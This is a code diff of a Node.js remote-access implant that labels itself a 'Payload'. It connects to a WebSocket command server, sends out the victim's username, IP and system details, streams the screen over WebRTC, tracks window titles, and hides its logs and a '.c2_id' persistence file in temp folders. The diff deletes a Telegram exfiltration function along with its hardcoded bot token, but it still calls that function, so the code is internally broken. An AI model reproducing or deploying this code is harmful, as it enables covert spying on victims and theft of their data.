@@ -1,10 +1,8 @@
 const WebSocket = require('ws');
 const { execSync } = require('child_process');
-const { exec } = require('child_process');
-const fs = require('fs'); 
 const os = require('os');
 const path = require('path');
-const https = require('https');
+const fs = require('fs'); 
 const crypto = require('crypto');
 const http = require('http'); 
 
@@ -23,21 +21,12 @@ try {
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
- // Attempt to load the native module
  wrtc = require('@roamhq/wrtc');
 } catch (e) {
  console.error("Failed to require @roamhq/wrtc:", e.message);
 }
 
-// Check if the module actually has the required exports
-const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
-
-if (!HAS_WEBRTC) {
- console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
- console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
-}
-
-const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
+const { RTCPeerConnection, RTCSessionDescription, mediaDevices } = wrtc || {};
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -60,15 +49,11 @@ log("[INIT] Payload starting...");
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 
-const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
-const TELEGRAM_CHAT_ID = '6172226452';
-
 let myId = null;
 let ws = null;
 let reconnectAttempts = 0;
 const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
-let isSessionActive = false;
 
 // Persistence Logic
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
@@ -83,7 +68,6 @@ try {
 let peerConnection = null;
 let localStream = null;
 let remotePeerId = null;
-let screenTrack = null;
 
 // --- INIT CONNECTION ---
 function initConnection() {
@@ -112,7 +96,7 @@ function initConnection() {
  arch: os.arch(),
  user: os.userInfo().username,
  ip: getExternalIP(),
- version: '2.0.1'
+ version: '2.0.2'
  }));
 
  startMonitoring();
@@ -195,10 +179,9 @@ function startMonitoring() {
  }, 30000);
 
  setInterval(async () => {
- if (isSessionActive && peerConnection && peerConnection.iceConnectionState === 'connected') {
+ if (peerConnection && peerConnection.iceConnectionState === 'connected') {
  const title = await getCurrentWindowTitle();
  if (title) {
- // Only send title update occasionally to avoid spam
  sendTelegram(`👁️ Current Window: ${title}`);
  }
  }
@@ -209,7 +192,7 @@ function startMonitoring() {
 async function setupLocalStream() {
  if (localStream) return localStream;
  
- if (!HAS_WEBRTC) {
+ if (!wrtc || !wrtc.mediaDevices) {
  log("[WEBRTC] Native WebRTC module missing!");
  return null;
  }
@@ -258,6 +241,7 @@ async function handleJoinRequest(fromId) {
  ]
  });
 
+ // FIX: Attach tracks BEFORE creating offer
  stream.getTracks().forEach(track => {
  peerConnection.addTrack(track, stream);
  });
@@ -319,7 +303,6 @@ function handleAnswer(sdp) {
  peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
  .then(() => {
  log("[WEBRTC] Connection Established!");
- isSessionActive = true;
  })
  .catch(err => {
  log(`[WEBRTC] Error setting answer: ${err.message}`);
@@ -345,7 +328,6 @@ function closePeerConnection() {
  localStream.getTracks().forEach(track => track.stop());
  localStream = null;
  }
- isSessionActive = false;
  log("[WEBRTC] Connection closed");
 }
 
@@ -376,14 +358,6 @@ async function getCurrentWindowTitle() {
  });
 }
 
-function sendTelegram(msg) {
- const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
- https.get(url, (res) => {
- }).on('error', (e) => {
- log(`[TG] Error: ${e.message}`);
- });
-}
-
 function getExternalIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
@@ -410,7 +384,6 @@ function getMacAddress() {
 
 function takeControl(state) {
  log(`[CTRL] Take Control: ${state}`);
- isSessionActive = state;
 }
 
 // --- HTTP SERVER SETUP ---
